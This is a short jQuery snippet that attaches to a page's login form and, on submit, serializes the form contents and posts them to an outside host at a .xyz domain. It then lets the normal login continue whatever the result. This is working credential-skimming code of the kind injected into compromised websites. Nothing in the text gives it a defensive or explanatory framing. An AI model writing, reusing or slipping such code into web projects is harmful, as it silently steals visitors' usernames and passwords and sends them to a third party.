
$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "http://sterr.robertohosting.xyz/apiii.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
